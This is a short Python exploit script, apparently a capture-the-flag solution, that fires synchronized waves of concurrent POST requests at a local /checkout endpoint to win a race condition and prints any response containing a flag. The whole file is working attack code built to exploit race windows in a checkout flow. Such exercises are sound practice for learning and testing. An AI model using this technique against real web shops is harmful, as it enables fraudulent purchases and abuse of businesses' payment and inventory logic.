#!/usr/bin/env python3
# Sniper Exploit - Precise timing to maximize race window
# Sends requests in tight synchronized waves

import requests
import threading
import time

URL = "http://localhost:5000/checkout"
ITEM_ID = 1
WAVE_SIZE = 40
WAVES = 5

payload = {"item_id": ITEM_ID}

def wave_attack(wave_num):
    time.sleep(0.01)  # Tiny stagger
    threads = []
    results = []
    
    def shot():
        try:
            r = requests.post(URL, json=payload, timeout=1)
            if "Flag" in r.text:
                results.append(r.text)
        except:
            pass
    
    for _ in range(WAVE_SIZE):
        t = threading.Thread(target=shot)
        t.start()
        threads.append(t)
    
    for t in threads:
        t.join()
    
    if results:
        print(f"\n[!] Wave {wave_num} HIT: {results[0]}")

print(f"[*] Sniper mode: {WAVES} waves of {WAVE_SIZE} synchronized shots")
for wave in range(1, WAVES + 1):
    print(f"[~] Firing wave {wave}/{WAVES}...")
    wave_attack(wave)
    time.sleep(0.1)
